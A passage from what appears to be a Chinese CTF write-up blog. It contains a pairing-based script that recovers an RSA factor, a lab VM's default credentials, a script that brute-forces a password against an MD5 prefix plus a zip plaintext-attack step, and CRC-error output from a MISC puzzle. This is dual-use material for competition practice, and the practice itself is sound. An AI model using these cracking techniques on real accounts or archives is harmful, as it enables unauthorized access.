class="hljs-number">2</span>)))<br><br>def <span class="hljs-title function_ invoke__">parse_point</span>(pair):<br>    x = <span class="hljs-title function_ invoke__">parse_fp2_scalar</span>(pair[<span class="hljs-number">0</span>])<br>    y = <span class="hljs-title function_ invoke__">parse_fp2_scalar</span>(pair[<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">return</span> (x, y)<br><br>pair_re = re.<span class="hljs-title function_ invoke__">compile</span>(r<span class="hljs-string">&#x27;\(\s*([^)]+?)\s*,\s*([^)]+?)\s*\)&#x27;</span>)<br><br>pairs_pre = pair_re.<span class="hljs-title function_ invoke__">findall</span>(pre)<br><span class="hljs-keyword">if</span> <span class="hljs-title function_ invoke__">len</span>(pairs_pre) &lt; <span class="hljs-number">2</span>:<br>    raise <span class="hljs-title function_ invoke__">ValueError</span>(<span class="hljs-string">&quot;未解析到 P、Q。&quot;</span>)<br>P_xy = <span class="hljs-title function_ invoke__">parse_point</span>(pairs_pre[<span class="hljs-number">0</span>])<br>Q_xy = <span class="hljs-title function_ invoke__">parse_point</span>(pairs_pre[<span class="hljs-number">1</span>])<br><br>pairs_gift = pair_re.<span class="hljs-title function_ invoke__">findall</span>(giftblock)<br><span class="hljs-keyword">if</span> <span class="hljs-title function_ invoke__">len</span>(pairs_gift) % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>:<br>    raise <span class="hljs-title function_ invoke__">ValueError</span>(<span class="hljs-string">&quot;gift 点对数量异常。&quot;</span>)<br>gift_points = []<br><span class="hljs-keyword">for</span> i in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">len</span>(pairs_gift), <span class="hljs-number">2</span>):<br>    gift_points.<span class="hljs-title function_ invoke__">append</span>((<span class="hljs-title function_ invoke__">parse_point</span>(pairs_gift[i]), <span class="hljs-title function_ invoke__">parse_point</span>(pairs_gift[i+<span class="hljs-number">1</span>])))<br><br><br>def <span class="hljs-title function_ invoke__">lcm</span>(a, b): <span class="hljs-keyword">return</span> a <span class="hljs-comment">// gcd(a, b) * b</span><br>L = <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> t in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">256</span>):<br>    L = <span class="hljs-title function_ invoke__">lcm</span>(L, t)<br>p = (<span class="hljs-title function_ invoke__">pow</span>(<span class="hljs-number">2</span>, a) * r * L) - <span class="hljs-number">1</span><br>MOD = p<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Fp2</span>:</span><br><span class="hljs-class">    <span class="hljs-title">__slots__</span> = (&quot;<span class="hljs-title">a</span>&quot;, &quot;<span class="hljs-title">b</span>&quot;)</span><br><span class="hljs-class">    <span class="hljs-title">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-title">self</span>, <span class="hljs-title">a</span>, <span class="hljs-title">b</span>):</span><br><span class="hljs-class">        <span class="hljs-title">self</span>.<span class="hljs-title">a</span> = <span class="hljs-title">a</span> % <span class="hljs-title">MOD</span></span><br><span class="hljs-class">        <span class="hljs-title">self</span>.<span class="hljs-title">b</span> = <span class="hljs-title">b</span> % <span class="hljs-title">MOD</span></span><br><span class="hljs-class">    <span class="hljs-title">def</span> <span class="hljs-title">__add__</span>(<span class="hljs-title">self</span>, <span class="hljs-title">other</span>): <span class="hljs-title">return</span> <span class="hljs-title">Fp2</span>(<span class="hljs-title">self</span>.<span class="hljs-title">a</span> + <span class="hljs-title">other</span>.<span class="hljs-title">a</span>, <span class="hljs-title">self</span>.<span class="hljs-title">b</span> + <span class="hljs-title">other</span>.<span class="hljs-title">b</span>)</span><br><span class="hljs-class">    <span class="hljs-title">def</span> <span class="hljs-title">__sub__</span>(<span class="hljs-title">self</span>, <span class="hljs-title">other</span>): <span class="hljs-title">return</span> <span class="hljs-title">Fp2</span>(<span class="hljs-title">self</span>.<span class="hljs-title">a</span> - <span class="hljs-title">other</span>.<span class="hljs-title">a</span>, <span class="hljs-title">self</span>.<span class="hljs-title">b</span> - <span class="hljs-title">other</span>.<span class="hljs-title">b</span>)</span><br><span class="hljs-class">    <span class="hljs-title">def</span> <span class="hljs-title">__neg__</span>(<span class="hljs-title">self</span>): <span class="hljs-title">return</span> <span class="hljs-title">Fp2</span>(-<span class="hljs-title">self</span>.<span class="hljs-title">a</span>, -<span class="hljs-title">self</span>.<span class="hljs-title">b</span>)</span><br><span class="hljs-class">    <span class="hljs-title">def</span> <span class="hljs-title">__mul__</span>(<span class="hljs-title">self</span>, <span class="hljs-title">other</span>):</span><br><span class="hljs-class">        <span class="hljs-title">ai</span> = (<span class="hljs-title">self</span>.<span class="hljs-title">a</span> * <span class="hljs-title">other</span>.<span class="hljs-title">b</span> + <span class="hljs-title">self</span>.<span class="hljs-title">b</span> * <span class="hljs-title">other</span>.<span class="hljs-title">a</span>) % <span class="hljs-title">MOD</span></span><br><span class="hljs-class">        <span class="hljs-title">br</span> = (<span class="hljs-title">self</span>.<span class="hljs-title">b</span> * <span class="hljs-title">other</span>.<span class="hljs-title">b</span> - <span class="hljs-title">self</span>.<span class="hljs-title">a</span> * <span class="hljs-title">other</span>.<span class="hljs-title">a</span>) % <span class="hljs-title">MOD</span></span><br><span class="hljs-class">        <span class="hljs-title">return</span> <span class="hljs-title">Fp2</span>(<span class="hljs-title">ai</span>, <span class="hljs-title">br</span>)</span><br><span class="hljs-class">    <span class="hljs-title">def</span> <span class="hljs-title">inv</span>(<span class="hljs-title">self</span>):</span><br><span class="hljs-class">        <span class="hljs-title">den</span> = (<span class="hljs-title">self</span>.<span class="hljs-title">a</span> * <span class="hljs-title">self</span>.<span class="hljs-title">a</span> + <span class="hljs-title">self</span>.<span class="hljs-title">b</span> * <span class="hljs-title">self</span>.<span class="hljs-title">b</span>) % <span class="hljs-title">MOD</span></span><br><span class="hljs-class">        <span class="hljs-title">invden</span> = <span class="hljs-title">pow</span>(<span class="hljs-title">den</span>, -1, <span class="hljs-title">MOD</span>)</span><br><span class="hljs-class">        <span class="hljs-title">return</span> <span class="hljs-title">Fp2</span>(-<span class="hljs-title">self</span>.<span class="hljs-title">a</span> * <span class="hljs-title">invden</span>, <span class="hljs-title">self</span>.<span class="hljs-title">b</span> * <span class="hljs-title">invden</span>)</span><br><span class="hljs-class">    <span class="hljs-title">def</span> <span class="hljs-title">__truediv__</span>(<span class="hljs-title">self</span>, <span class="hljs-title">other</span>): <span class="hljs-title">return</span> <span class="hljs-title">self</span> * <span class="hljs-title">other</span>.<span class="hljs-title">inv</span>()</span><br><span class="hljs-class">    <span class="hljs-title">def</span> <span class="hljs-title">__pow__</span>(<span class="hljs-title">self</span>, <span class="hljs-title">e</span>):</span><br><span class="hljs-class">        <span class="hljs-title">e</span> = <span class="hljs-title">int</span>(<span class="hljs-title">e</span>)</span><br><span class="hljs-class">        <span class="hljs-title">out</span> = <span class="hljs-title">Fp2</span>(0, 1)</span><br><span class="hljs-class">        <span class="hljs-title">base</span> = <span class="hljs-title">self</span></span><br><span class="hljs-class">        <span class="hljs-title">while</span> <span class="hljs-title">e</span>:</span><br><span class="hljs-class">            <span class="hljs-title">if</span> <span class="hljs-title">e</span> &amp; 1: <span class="hljs-title">out</span> = <span class="hljs-title">out</span> * <span class="hljs-title">base</span></span><br><span class="hljs-class">            <span class="hljs-title">base</span> = <span class="hljs-title">base</span> * <span class="hljs-title">base</span></span><br><span class="hljs-class">            <span class="hljs-title">e</span> &gt;&gt;= 1</span><br><span class="hljs-class">        <span class="hljs-title">return</span> <span class="hljs-title">out</span></span><br><span class="hljs-class">    <span class="hljs-title">def</span> <span class="hljs-title">__eq__</span>(<span class="hljs-title">self</span>, <span class="hljs-title">other</span>):</span><br><span class="hljs-class">        <span class="hljs-title">return</span> (<span class="hljs-title">self</span>.<span class="hljs-title">a</span> - <span class="hljs-title">other</span>.<span class="hljs-title">a</span>) % <span class="hljs-title">MOD</span> == 0 <span class="hljs-title">and</span> (<span class="hljs-title">self</span>.<span class="hljs-title">b</span> - <span class="hljs-title">other</span>.<span class="hljs-title">b</span>) % <span class="hljs-title">MOD</span> == 0</span><br><span class="hljs-class">    <span class="hljs-title">def</span> <span class="hljs-title">__repr__</span>(<span class="hljs-title">self</span>): <span class="hljs-title">return</span> <span class="hljs-title">f</span>&quot;</span>&#123;<span class="hljs-built_in">self</span>.a&#125;*i+&#123;<span class="hljs-built_in">self</span>.b&#125;<span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">def F(e):</span><br><span class="hljs-string">    if isinstance(e, Fp2): return e</span><br><span class="hljs-string">    return Fp2(0, e)</span><br><span class="hljs-string"></span><br><span class="hljs-string">def from_tuple(t): return Fp2(t[0], t[1])</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">class ECPoint:</span><br><span class="hljs-string">    __slots__ = (&quot;</span>x<span class="hljs-string">&quot;, &quot;</span>y<span class="hljs-string">&quot;, &quot;</span>inf<span class="hljs-string">&quot;, &quot;</span>E<span class="hljs-string">&quot;)</span><br><span class="hljs-string">    def __init__(self, E, x=None, y=None, inf=False):</span><br><span class="hljs-string">        self.E = E; self.x = x; self.y = y; self.inf = inf</span><br><span class="hljs-string">    @staticmethod</span><br><span class="hljs-string">    def infinity(E): return ECPoint(E, None, None, True)</span><br><span class="hljs-string">    def copy(self): return ECPoint.infinity(self.E) if self.inf else ECPoint(self.E, self.x, self.y, False)</span><br><span class="hljs-string"></span><br><span class="hljs-string">class EllipticCurve:</span><br><span class="hljs-string">    __slots__ = (&quot;</span>A<span class="hljs-string">&quot;, &quot;</span>B<span class="hljs-string">&quot;)</span><br><span class="hljs-string">    def __init__(self, A, B):</span><br><span class="hljs-string">        self.A = F(A); self.B = F(B)</span><br><span class="hljs-string">    def add_with_slope(self, P: ECPoint, Q: ECPoint):</span><br><span class="hljs-string">        if P.inf: return Q.copy(), None</span><br><span class="hljs-string">        if Q.inf: return P.copy(), None</span><br><span class="hljs-string">        if P.x == Q.x:</span><br><span class="hljs-string">            if (P.y + Q.y) == Fp2(0,0):</span><br><span class="hljs-string">                return ECPoint.infinity(self), None</span><br><span class="hljs-string">            lam = (F(3)*P.x*P.x + self.A) / (F(2)*P.y)</span><br><span class="hljs-string">        else:</span><br><span class="hljs-string">            lam = (Q.y - P.y) / (Q.x - P.x)</span><br><span class="hljs-string">        if P.x == Q.x and P.y == Q.y:</span><br><span class="hljs-string">            x3 = lam*lam - F(2)*P.x</span><br><span class="hljs-string">            y3 = lam*(P.x - x3) - P.y</span><br><span class="hljs-string">        else:</span><br><span class="hljs-string">            x3 = lam*lam - P.x - Q.x</span><br><span class="hljs-string">            y3 = lam*(P.x - x3) - P.y</span><br><span class="hljs-string">        return ECPoint(self, x3, y3, False), lam</span><br><span class="hljs-string">    def add(self, P, Q): return self.add_with_slope(P, Q)[0]</span><br><span class="hljs-string">    def mul(self, P: ECPoint, k: int):</span><br><span class="hljs-string">        if P.inf or k == 0: return ECPoint.infinity(self)</span><br><span class="hljs-string">        if k &lt; 0: return self.mul(ECPoint(self, P.x, -P.y, False), -k)</span><br><span class="hljs-string">        R = ECPoint.infinity(self); B = P.copy()</span><br><span class="hljs-string">        while k:</span><br><span class="hljs-string">            if k &amp; 1: R = self.add(R, B)</span><br><span class="hljs-string">            B = self.add(B, B)</span><br><span class="hljs-string">            k &gt;&gt;= 1</span><br><span class="hljs-string">        return R</span><br><span class="hljs-string">    def miller_raw(self, P: ECPoint, Q: ECPoint, r: int):</span><br><span class="hljs-string">        if P.inf or Q.inf: return Fp2(0,1)</span><br><span class="hljs-string">        f = Fp2(0,1)</span><br><span class="hljs-string">        T = P.copy()</span><br><span class="hljs-string">        bits = bin(r)[3:]</span><br><span class="hljs-string">        for b in bits:</span><br><span class="hljs-string">            R, lam = self.add_with_slope(T, T)</span><br><span class="hljs-string">            if lam is None:</span><br><span class="hljs-string">                g = Fp2(0,1)</span><br><span class="hljs-string">            else:</span><br><span class="hljs-string">                nu = T.y - lam*T.x</span><br><span class="hljs-string">                num = (Q.y - lam*Q.x - nu)</span><br><span class="hljs-string">                den = (Q.x - R.x)</span><br><span class="hljs-string">                g = num / den</span><br><span class="hljs-string">            f = (f*f) * g</span><br><span class="hljs-string">            T = R</span><br><span class="hljs-string">            if b == &#x27;1&#x27;:</span><br><span class="hljs-string">                R, lam = self.add_with_slope(T, P)</span><br><span class="hljs-string">                if lam is None:</span><br><span class="hljs-string">                    g = Fp2(0,1)</span><br><span class="hljs-string">                else:</span><br><span class="hljs-string">                    nu = T.y - lam*T.x</span><br><span class="hljs-string">                    num = (Q.y - lam*Q.x - nu)</span><br><span class="hljs-string">                    den = (Q.x - R.x)</span><br><span class="hljs-string">                    g = num / den</span><br><span class="hljs-string">                f = f * g</span><br><span class="hljs-string">                T = R</span><br><span class="hljs-string">        return f</span><br><span class="hljs-string">    def weil_pairing_red(self, P: ECPoint, Q: ECPoint, r: int):</span><br><span class="hljs-string">        fPQ = self.miller_raw(P, Q, r)</span><br><span class="hljs-string">        fQP = self.miller_raw(Q, P, r)</span><br><span class="hljs-string">        val = fPQ / fQP</span><br><span class="hljs-string">        if r % 2 == 1: val = val * Fp2(0, -1)</span><br><span class="hljs-string">        return val ** ((MOD*MOD - 1)//r)</span><br><span class="hljs-string"></span><br><span class="hljs-string"># ----------------- 初始化 P0, Q0 -----------------</span><br><span class="hljs-string">E0 = EllipticCurve(0, 1)</span><br><span class="hljs-string">P0 = ECPoint(E0, from_tuple(P_xy[0]), from_tuple(P_xy[1]), False)</span><br><span class="hljs-string">Q0 = ECPoint(E0, from_tuple(Q_xy[0]), from_tuple(Q_xy[1]), False)</span><br><span class="hljs-string">co_r = (p + 1) // r</span><br><span class="hljs-string">P_r = E0.mul(P0, co_r)</span><br><span class="hljs-string">Q_r = E0.mul(Q0, co_r)</span><br><span class="hljs-string">w_base = E0.weil_pairing_red(P_r, Q_r, r)</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">table = &#123;&#125;</span><br><span class="hljs-string">val = Fp2(0,1)</span><br><span class="hljs-string">for j in range(r):</span><br><span class="hljs-string">    key = (val.a % r, val.b % r)</span><br><span class="hljs-string">    if key not in table:  # 避免重复</span><br><span class="hljs-string">        table[key] = j</span><br><span class="hljs-string">    val = val * w_base</span><br><span class="hljs-string"></span><br><span class="hljs-string">inv_2a_mod_r = inv_mod(pow(2, a, r), r)</span><br><span class="hljs-string">xs_le = []</span><br><span class="hljs-string"></span><br><span class="hljs-string">for idx, (phiP_xy, phiQ_xy) in enumerate(gift_points):</span><br><span class="hljs-string">    x1 = from_tuple(phiP_xy[0]); y1 = from_tuple(phiP_xy[1])</span><br><span class="hljs-string">    x2 = from_tuple(phiQ_xy[0]); y2 = from_tuple(phiQ_xy[1])</span><br><span class="hljs-string">    S1 = y1*y1 - x1*x1*x1</span><br><span class="hljs-string">    S2 = y2*y2 - x2*x2*x2</span><br><span class="hljs-string">    dx = x1 - x2</span><br><span class="hljs-string">    if dx == Fp2(0,0):</span><br><span class="hljs-string">        raise RuntimeError(f&quot;</span>退化 x1==x2 at gift &#123;idx&#125;<span class="hljs-string">&quot;)</span><br><span class="hljs-string">    A1 = (S1 - S2) / dx</span><br><span class="hljs-string">    B1 = S1 - A1*x1</span><br><span class="hljs-string">    E1 = EllipticCurve(A1, B1)</span><br><span class="hljs-string">    phiP = ECPoint(E1, x1, y1, False)</span><br><span class="hljs-string">    phiQ = ECPoint(E1, x2, y2, False)</span><br><span class="hljs-string">    phiP_r = E1.mul(phiP, co_r)</span><br><span class="hljs-string">    phiQ_r = E1.mul(phiQ, co_r)</span><br><span class="hljs-string">    w1 = E1.weil_pairing_red(phiP_r, phiQ_r, r)</span><br><span class="hljs-string">    key = (w1.a % r, w1.b % r)</span><br><span class="hljs-string">    j = table.get(key)</span><br><span class="hljs-string">    if j is None:</span><br><span class="hljs-string">        cur = Fp2(0,1); j = None</span><br><span class="hljs-string">        for t in range(r):</span><br><span class="hljs-string">            cur_key = (cur.a % r, cur.b % r)</span><br><span class="hljs-string">            if cur_key == key:</span><br><span class="hljs-string">                j = t; break</span><br><span class="hljs-string">            cur = cur * w_base</span><br><span class="hljs-string">        if j is None:</span><br><span class="hljs-string">            raise RuntimeError(f&quot;</span>离散对数失败 at gift &#123;idx&#125;<span class="hljs-string">&quot;)</span><br><span class="hljs-string">    x_byte = (j * inv_2a_mod_r) % r</span><br><span class="hljs-string">    if not (1 &lt;= x_byte &lt;= 255):</span><br><span class="hljs-string">        raise RuntimeError(f&quot;</span>异常字节 &#123;x_byte&#125; 不在 <span class="hljs-number">1</span>.<span class="hljs-number">.255</span><span class="hljs-string">&quot;)</span><br><span class="hljs-string">    xs_le.append(x_byte)</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">pp = sum(b &lt;&lt; (8*i) for i, b in enumerate(xs_le))</span><br><span class="hljs-string">if n % pp != 0:</span><br><span class="hljs-string">    raise RuntimeError(&quot;</span>pp 不能整除 n<span class="hljs-string">&quot;)</span><br><span class="hljs-string">qq = n // pp</span><br><span class="hljs-string">phi_n = (pp - 1) * (qq - 1)</span><br><span class="hljs-string">d = inv_mod(e, phi_n)</span><br><span class="hljs-string">m = pow(c, d, n)</span><br><span class="hljs-string">flag = long_to_bytes(m)</span><br><span class="hljs-string"></span><br><span class="hljs-string">print(&quot;</span>r =<span class="hljs-string">&quot;, r, &quot;</span>a =<span class="hljs-string">&quot;, a)</span><br><span class="hljs-string">print(&quot;</span>pp bits:<span class="hljs-string">&quot;, pp.bit_length())</span><br><span class="hljs-string">print(&quot;</span>pp | n ?<span class="hljs-string">&quot;, n % pp == 0)</span><br><span class="hljs-string">print(&quot;</span>flag =<span class="hljs-string">&quot;, flag.decode(&quot;</span>utf-<span class="hljs-number">8</span><span class="hljs-string">&quot;, errors=&quot;</span>ignore<span class="hljs-string">&quot;))</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p><img src="/./img/6dbL2C9B2aDrxufZ/1757131678002-6851b30d-f3b0-4ac3-b933-d30f1161009e-412709.png" alt="1757131678002-6851b30d-f3b0-4ac3-b933-d30f1161009e.png"></p><h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><h2 id="siem"><a href="#siem" class="headerlink" title="siem"></a>siem</h2><p>虚拟机系统密码：wazuh-user&#x2F;wazuh</p><p>Web地址：<a href="http://ip/">http://IP:80</a> 账号密码admin&#x2F;admin</p><p>ssh <a href="mailto:&#x77;&#x61;&#x7a;&#x75;&#x68;&#45;&#x75;&#x73;&#x65;&#x72;&#x40;&#x31;&#57;&#x32;&#x2e;&#x31;&#54;&#x38;&#46;&#x31;&#x39;&#x38;&#x2e;&#49;&#x34;&#50;">wazuh-user@192.168.198.142</a><font style="color:rgba(255, 255, 255, 0.9);background-color:rgba(50, 64, 92, 0.6);"><br></font></p><p><a href="http://192.168.198.142/">http://192.168.198.142:80</a></p><p><img src="/./img/6dbL2C9B2aDrxufZ/1757133180852-4fe20de1-b420-444b-b792-dbde4033e1c0-222079.png" alt="1757133180852-4fe20de1-b420-444b-b792-dbde4033e1c0.png"></p><blockquote><p>更新: 2025-09-06 14:45:25<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/iquz26q5yg7lvr1s">https://www.yuque.com/chaye-apqbl/vsc85q/iquz26q5yg7lvr1s</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/WP/2025/%E4%BB%A3%E7%BB%83/MISC/"/>
    <url>/2026/01/19/WP/2025/%E4%BB%A3%E7%BB%83/MISC/</url>
    
    <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h1 id="MISC1"><a href="#MISC1" class="headerlink" title="MISC1"></a>MISC1</h1><p><a href="https://www.yuque.com/attachments/yuque/0/2025/zip/42988179/1752134396219-16101612-be0f-49a0-a5ad-c2f69a667948.zip">HeiMDall5的附件.zip</a></p><p>程序员小明制作了一个加密程序 并把自己想隐藏的东西写进了程序里 只需要输入正确的密码就可以提取隐藏的东西 聪明的小明就用来隐藏自己的东西，</p><p>有一天在小明的电脑里发现了一个神秘的压缩包 但貌似与小明隐藏的东西有关</p><p>但是小明犯糊涂忘记了自己的密码，他还记得一点点密码的信息。你能就此帮他找回密码吗？</p><p>密码：_???k?ng_Ctfer</p><p>MD5前6位：1adc88（后面的爷咋可能记住）</p><p>另外小明还说了密码只有大小写的字母 没有数字</p><p>你能帮助小明破解密码 并获取压缩包的秘密吗？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> string<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_passwords</span>():<br>    <span class="hljs-comment"># 密码模板：_???k?ng_Ctfer</span><br>    <span class="hljs-comment"># 问号位置需要填充大小写字母</span><br>    template = <span class="hljs-string">&quot;_???k?ng_Ctfer&quot;</span><br>    question_indices = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>]  <span class="hljs-comment"># 问号的位置索引</span><br><br>    <span class="hljs-comment"># 生成所有可能的大小写字母组合</span><br>    <span class="hljs-keyword">for</span> letters <span class="hljs-keyword">in</span> itertools.product(string.ascii_letters, repeat=<span class="hljs-number">4</span>):<br>        password = <span class="hljs-built_in">list</span>(template)<br>        <span class="hljs-comment"># 填充问号位置</span><br>        <span class="hljs-keyword">for</span> i, char <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(question_indices, letters):<br>            password[i] = char<br>        <span class="hljs-keyword">yield</span> <span class="hljs-string">&#x27;&#x27;</span>.join(password)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_password</span>(<span class="hljs-params">password</span>):<br>    <span class="hljs-comment"># 计算MD5哈希</span><br>    md5_hash = hashlib.md5(password.encode()).hexdigest()<br>    <span class="hljs-comment"># 检查前6位是否为1adc88</span><br>    <span class="hljs-keyword">return</span> md5_hash.startswith(<span class="hljs-string">&quot;1adc88&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;开始爆破密码...&quot;</span>)<br>    <span class="hljs-keyword">for</span> password <span class="hljs-keyword">in</span> generate_passwords():<br>        <span class="hljs-keyword">if</span> check_password(password):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;找到匹配的密码: <span class="hljs-subst">&#123;password&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;没有找到匹配的密码&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p><strong>_HaCking_Ctfer</strong></p><p><strong>输入给exe自行解密，</strong></p><p><img src="/./img/jk8zxcM4b8QksPx1/1752134645881-72b1a63b-19f8-4505-8cad-66b1d3d01b81-223553.png" alt="1752134645881-72b1a63b-19f8-4505-8cad-66b1d3d01b81.png"></p><p><strong>只得到rookie.jpg 压缩后明文攻击</strong></p><p><img src="/./img/jk8zxcM4b8QksPx1/1752134058662-c2a499ac-7e15-4998-adff-ea3f1c2f4045-052888.png" alt="1752134058662-c2a499ac-7e15-4998-adff-ea3f1c2f4045.png"></p><p>Unkn0wn</p><p><img src="/./img/jk8zxcM4b8QksPx1/1752134128697-dd2360cf-bfdc-449a-9c4e-7d6f09c9f00f-939266.png" alt="1752134128697-dd2360cf-bfdc-449a-9c4e-7d6f09c9f00f.png"></p><h1 id="MISC2"><a href="#MISC2" class="headerlink" title="MISC2"></a>MISC2</h1><p><a href="https://www.yuque.com/attachments/yuque/0/2025/zip/42988179/1752134376056-aec0d798-5362-49bf-b62f-867d1bdcb482.zip">catfeatherrain的附件.zip</a></p><p><img src="/./img/jk8zxcM4b8QksPx1/1752140578882-d4b9870f-c2c4-43d5-9d10-16cd9b205280-197990.png" alt="1752140578882-d4b9870f-c2c4-43d5-9d10-16cd9b205280.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python">*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">1</span>]; <span class="hljs-keyword">in</span> data: 504b0304; expected: 182333b3<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">2</span>]; <span class="hljs-keyword">in</span> data: <span class="hljs-number">14000100</span>; expected: 54323b8e<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">3</span>]; <span class="hljs-keyword">in</span> data: 00006c6a; expected: 9a48185c<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">4</span>]; <span class="hljs-keyword">in</span> data: 76541cc6; expected: e2108601<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">5</span>]; <span class="hljs-keyword">in</span> data: 17760f00; expected: 5ebf4f0c<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">6</span>]; <span class="hljs-keyword">in</span> data: 00000300; expected: e585836d<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">7</span>]; <span class="hljs-keyword">in</span> data: 00000500; expected: fe602c12<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">8</span>]; <span class="hljs-keyword">in</span> data: 0000322e; expected: 4d23b4f8<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">9</span>]; <span class="hljs-keyword">in</span> data: 7478740a; expected: 9e5f8aa3<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">10</span>]; <span class="hljs-keyword">in</span> data: 41d206ee; expected: ea3f2a43<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">11</span>]; <span class="hljs-keyword">in</span> data: 2fa7f7c7; expected: 7cbc770d<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">12</span>]; <span class="hljs-keyword">in</span> data: 40246d00; expected: 3c9489fc<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">13</span>]; <span class="hljs-keyword">in</span> data: 8fbf504b; expected: 6f3affda<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">14</span>]; <span class="hljs-keyword">in</span> data: 03041400; expected: 0e0f5830<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">15</span>]; <span class="hljs-keyword">in</span> data: <span class="hljs-number">0</span>1000000; expected: d6bcde35<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">16</span>]; <span class="hljs-keyword">in</span> data: 6e6a7654; expected: e175c6c3<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">17</span>]; <span class="hljs-keyword">in</span> data: 9af52d57; expected: b75575b3<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">18</span>]; <span class="hljs-keyword">in</span> data: 0f000000; expected: 